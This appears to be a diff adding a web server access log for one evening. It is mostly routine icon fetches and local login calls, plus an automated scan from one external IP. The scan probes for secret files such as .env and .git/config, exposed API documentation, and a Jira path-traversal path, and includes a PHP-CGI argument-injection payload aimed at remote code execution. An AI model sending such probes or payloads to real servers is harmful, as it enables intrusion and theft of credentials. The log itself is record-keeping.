+[2025. 11. 15. 오후 7:52:33] [REQ] 192.168.219.1 GET /icons/icon-192.png
+[2025. 11. 15. 오후 7:53:01] [REQ] 192.168.219.1 GET /icons/maskable-512.png
+[2025. 11. 15. 오후 7:53:01] [REQ] 192.168.219.1 GET /icons/icon-192.png
+[2025. 11. 15. 오후 7:53:08] [REQ] 207.154.197.113 POST /graphql
+[2025. 11. 15. 오후 7:53:09] [REQ] 207.154.197.113 POST /api
+[2025. 11. 15. 오후 7:53:10] [REQ] 207.154.197.113 POST /api/graphql
+[2025. 11. 15. 오후 7:53:11] [REQ] 207.154.197.113 POST /graphql/api
+[2025. 11. 15. 오후 7:53:12] [REQ] 207.154.197.113 POST /api/gql
+[2025. 11. 15. 오후 7:53:14] [REQ] 207.154.197.113 GET /swagger-ui.html
+[2025. 11. 15. 오후 7:53:14] [REQ] 207.154.197.113 GET /swagger/index.html
+[2025. 11. 15. 오후 7:53:15] [REQ] 207.154.197.113 GET /swagger/swagger-ui.html
+[2025. 11. 15. 오후 7:53:16] [REQ] 207.154.197.113 GET /webjars/swagger-ui/index.html
+[2025. 11. 15. 오후 7:53:17] [REQ] 207.154.197.113 GET /swagger.json
+[2025. 11. 15. 오후 7:53:18] [REQ] 207.154.197.113 GET /swagger/v1/swagger.json
+[2025. 11. 15. 오후 7:53:19] [REQ] 207.154.197.113 GET /v2/api-docs
+[2025. 11. 15. 오후 7:53:20] [REQ] 207.154.197.113 GET /v3/api-docs
+[2025. 11. 15. 오후 7:53:21] [REQ] 207.154.197.113 GET /api-docs/swagger.json
+[2025. 11. 15. 오후 7:53:22] [REQ] 207.154.197.113 GET /api/swagger.json
+[2025. 11. 15. 오후 7:53:23] [REQ] 207.154.197.113 GET /@vite/env
+[2025. 11. 15. 오후 7:53:24] [REQ] 207.154.197.113 GET /actuator/env
+[2025. 11. 15. 오후 7:53:25] [REQ] 207.154.197.113 POST /php-cgi/php-cgi.exe?%ADd+cgi.force_redirect%3D0+%ADd+disable_functions%3D""+%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input
+[2025. 11. 15. 오후 7:53:26] [REQ] 207.154.197.113 GET /server
+[2025. 11. 15. 오후 7:53:27] [REQ] 207.154.197.113 GET /.vscode/sftp.json
+[2025. 11. 15. 오후 7:53:27] [REQ] 207.154.197.113 GET /about
+[2025. 11. 15. 오후 7:53:28] [REQ] 207.154.197.113 GET /debug/default/view?panel=config
+[2025. 11. 15. 오후 7:53:29] [REQ] 207.154.197.113 GET /v2/_catalog
+[2025. 11. 15. 오후 7:53:29] [REQ] 104.232.199.119 GET /favicon.ico
+[2025. 11. 15. 오후 7:53:30] [REQ] 104.232.199.119 GET /icons/icon-192.png
+[2025. 11. 15. 오후 7:53:30] [REQ] 207.154.197.113 GET /ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application
+[2025. 11. 15. 오후 7:53:30] [REQ] 104.168.71.48 GET /favicon.ico
+[2025. 11. 15. 오후 7:53:31] [REQ] 207.154.197.113 GET /server-status
+[2025. 11. 15. 오후 7:53:31] [REQ] 104.168.71.48 GET /icons/icon-192.png
+[2025. 11. 15. 오후 7:53:32] [REQ] 207.154.197.113 GET /login.action
+[2025. 11. 15. 오후 7:53:33] [REQ] 207.154.197.113 GET /_all_dbs
+[2025. 11. 15. 오후 7:53:34] [REQ] 207.154.197.113 GET /.DS_Store
+[2025. 11. 15. 오후 7:53:35] [REQ] 207.154.197.113 GET /.env
+[2025. 11. 15. 오후 7:53:36] [REQ] 207.154.197.113 GET /.git/config
+[2025. 11. 15. 오후 7:53:37] [REQ] 207.154.197.113 GET /s/4313e22313e2733313e2531313/_/;/META-INF/maven/com.atlassian.jira/jira-webapp-dist/pom.properties
+[2025. 11. 15. 오후 7:53:38] [REQ] 207.154.197.113 GET /config.json
+[2025. 11. 15. 오후 7:53:39] [REQ] 207.154.197.113 GET /telescope/requests
+[2025. 11. 15. 오후 7:53:40] [REQ] 207.154.197.113 GET /info.php
+[2025. 11. 15. 오후 8:20:35] [REQ] 98.94.56.20 GET /favicon.ico
+[2025. 11. 15. 오후 8:20:35] [REQ] 98.94.56.20 GET /favicon.png
+[2025. 11. 15. 오후 8:20:36] [REQ] 98.94.56.20 GET /icons/icon-192.png
+[2025. 11. 15. 오후 8:32:21] [REQ] 4.236.33.151 HEAD /icons/maskable-512.png
+[2025. 11. 15. 오후 8:32:21] [REQ] 4.236.33.151 HEAD /icons/icon-512.png
+[2025. 11. 15. 오후 8:32:21] [REQ] 4.236.33.151 HEAD /icons/icon-192.png
+[2025. 11. 15. 오후 8:32:21] [REQ] 4.236.33.151 GET /icons/maskable-512.png
+[2025. 11. 15. 오후 8:32:21] [REQ] 4.236.33.151 GET /icons/icon-512.png
+[2025. 11. 15. 오후 8:32:21] [REQ] 4.236.33.151 GET /icons/icon-192.png
+[2025. 11. 15. 오후 8:32:21] [REQ] 4.236.33.151 GET /icons/icon-192.png
+[2025. 11. 15. 오후 8:32:21] [REQ] 4.236.33.151 GET /icons/icon-512.png
+[2025. 11. 15. 오후 8:32:21] [REQ] 4.236.33.151 GET /icons/maskable-512.png
+[2025. 11. 15. 오후 8:32:21] [REQ] 4.236.33.151 GET /icons/maskable-512.png
+[2025. 11. 15. 오후 8:32:21] [REQ] 4.236.33.151 GET /icons/icon-512.png
+[2025. 11. 15. 오후 8:32:21] [REQ] 4.236.33.151 GET /icons/icon-192.png
+[2025. 11. 15. 오후 8:32:22] [REQ] 4.236.33.151 GET /favicon.ico
+[2025. 11. 15. 오후 8:32:22] [REQ] 4.236.33.151 GET /icons/icon-192.png
+[2025. 11. 15. 오후 8:32:23] [REQ] 192.168.219.1 GET /icons/icon-512.png
+[2025. 11. 15. 오후 9:27:09] [REQ] 74.7.230.48 GET /robots.txt
+[2025. 11. 15. 오후 9:27:24] [REQ] 74.7.227.200 GET /icons/icon-192.png
+[2025. 11. 15. 오후 9:41:27] [REQ] 4.236.33.188 HEAD /icons/icon-192.png
+[2025. 11. 15. 오후 9:41:27] [REQ] 4.236.33.188 HEAD /icons/maskable-512.png
+[2025. 11. 15. 오후 9:41:27] [REQ] 4.236.33.188 HEAD /icons/icon-512.png
+[2025. 11. 15. 오후 9:41:27] [REQ] 4.236.33.188 GET /icons/icon-192.png
+[2025. 11. 15. 오후 9:41:27] [REQ] 4.236.33.188 GET /icons/maskable-512.png
+[2025. 11. 15. 오후 9:41:27] [REQ] 4.236.33.188 GET /icons/icon-512.png
+[2025. 11. 15. 오후 9:41:27] [REQ] 4.236.33.188 GET /icons/icon-192.png
+[2025. 11. 15. 오후 9:41:27] [REQ] 4.236.33.188 GET /icons/icon-512.png
+[2025. 11. 15. 오후 9:41:27] [REQ] 4.236.33.188 GET /icons/maskable-512.png
+[2025. 11. 15. 오후 9:41:27] [REQ] 4.236.33.188 GET /icons/icon-512.png
+[2025. 11. 15. 오후 9:41:27] [REQ] 4.236.33.188 GET /icons/maskable-512.png
+[2025. 11. 15. 오후 9:41:27] [REQ] 4.236.33.188 GET /icons/icon-192.png
+[2025. 11. 15. 오후 9:41:27] [REQ] 192.168.219.1 GET /icons/icon-512.png
+[2025. 11. 15. 오후 9:41:27] [REQ] 4.236.33.188 GET /favicon.ico
+[2025. 11. 15. 오후 9:41:28] [REQ] 4.236.33.188 GET /icons/icon-192.png
+[2025. 11. 15. 오후 9:41:38] [REQ] 192.168.219.1 GET /icons/maskable-512.png
+[2025. 11. 15. 오후 9:41:38] [REQ] 192.168.219.1 GET /icons/icon-512.png
+[2025. 11. 15. 오후 9:41:38] [REQ] 192.168.219.1 GET /icons/icon-192.png
+[2025. 11. 15. 오후 9:45:47] [REQ] 4.236.33.188 HEAD /icons/icon-512.png
+[2025. 11. 15. 오후 9:45:47] [REQ] 4.236.33.188 HEAD /icons/icon-192.png
+[2025. 11. 15. 오후 9:45:47] [REQ] 4.236.33.188 HEAD /icons/maskable-512.png
+[2025. 11. 15. 오후 9:45:47] [REQ] 4.236.33.188 GET /icons/icon-512.png
+[2025. 11. 15. 오후 9:45:47] [REQ] 4.236.33.188 GET /icons/icon-192.png
+[2025. 11. 15. 오후 9:45:47] [REQ] 4.236.33.188 GET /icons/maskable-512.png
+[2025. 11. 15. 오후 9:45:47] [REQ] 4.236.33.188 GET /icons/icon-512.png
+[2025. 11. 15. 오후 9:45:47] [REQ] 4.236.33.188 GET /icons/maskable-512.png
+[2025. 11. 15. 오후 9:45:47] [REQ] 4.236.33.188 GET /icons/icon-192.png
+[2025. 11. 15. 오후 9:45:47] [REQ] 4.236.33.188 GET /favicon.ico
+[2025. 11. 15. 오후 9:45:47] [REQ] 4.236.33.188 GET /icons/icon-192.png
+[2025. 11. 15. 오후 9:45:47] [REQ] 4.236.33.188 GET /icons/maskable-512.png
+[2025. 11. 15. 오후 9:45:47] [REQ] 4.236.33.188 GET /icons/icon-512.png
+[2025. 11. 15. 오후 9:45:47] [REQ] 4.236.33.188 GET /icons/icon-192.png
+[2025. 11. 15. 오후 9:45:48] [REQ] 192.168.219.1 GET /icons/icon-512.png
+[2025. 11. 15. 오후 9:46:00] [REQ] 192.168.219.1 GET /icons/icon-192.png
+[2025. 11. 15. 오후 9:46:00] [REQ] 192.168.219.1 GET /icons/maskable-512.png
+[2025. 11. 15. 오후 9:48:49] [REQ] 64.233.173.199 GET /.well-known/assetlinks.json
+[2025. 11. 15. 오후 9:48:49] [REQ] 64.233.173.199 GET /.well-known/assetlinks.json
+[2025. 11. 15. 오후 9:48:59] [REQ] 192.168.219.1 POST /api/login-check
+[2025. 11. 15. 오후 9:49:07] [REQ] 192.168.219.1 GET /api/user
+[2025. 11. 15. 오후 9:49:14] [REQ] 192.168.219.1 POST /api/login-check
+[2025. 11. 15. 오후 9:49:15] [REQ] 192.168.219.1 GET /api/ms
+[2025. 11. 15. 오후 9:51:51] [REQ] 44.251.6.32 GET /favicon.ico
+[2025. 11. 15. 오후 9:51:55] [REQ] 44.251.6.32 GET /favicon.ico
+[2025. 11. 15. 오후 9:57:49] [REQ] 192.168.219.1 GET /api/user
+[2025. 11. 15. 오후 9:59:56] [REQ] 64.233.173.197 GET /.well-known/assetlinks.json
+[2025. 11. 15. 오후 9:59:56] [REQ] 64.233.173.198 GET /.well-known/assetlinks.json
+[2025. 11. 15. 오후 9:59:59] [REQ] 192.168.219.1 GET /favicon.ico
+[2025. 11. 15. 오후 10:01:56] [REQ] 192.168.219.1 POST /api/login-check
+[2025. 11. 15. 오후 10:01:59] [REQ] 192.168.219.1 GET /api/user
+[2025. 11. 15. 오후 10:02:08] [REQ] 64.233.173.197 GET /.well-known/assetlinks.json
+[2025. 11. 15. 오후 10:02:08] [REQ] 64.233.173.197 GET /.well-known/assetlinks.json
+[2025. 11. 15. 오후 10:02:53] [REQ] 192.168.219.1 GET /api/user
+[2025. 11. 15. 오후 10:03:07] [REQ] 192.168.219.1 GET /api/user
+[2025. 11. 15. 오후 10:03:08] [REQ] 192.168.219.1 GET /api/user
+[2025. 11. 15. 오후 10:03:26] [REQ] 192.168.219.1 GET /api/user
+[2025. 11. 15. 오후 10:04:05] [REQ] 192.168.219.1 GET /api/user
+[2025. 11. 15. 오후 10:04:20] [REQ] 192.168.219.1 POST /api/login-check
+[2025. 11. 15. 오후 10:04:22] [REQ] 192.168.219.1 GET /api/user
+[2025. 11. 15. 오후 10:05:14] [REQ] 192.168.219.1 GET /api/user
+[2025. 11. 15. 오후 10:05:16] [REQ] 192.168.219.1 GET /api/user
+[2025. 11. 15. 오후 10:53:17] [REQ] 52.16.245.145 GET /favicon.ico
+[2025. 11. 15. 오후 10:53:19] [REQ] 52.16.245.145 HEAD /favicon.ico
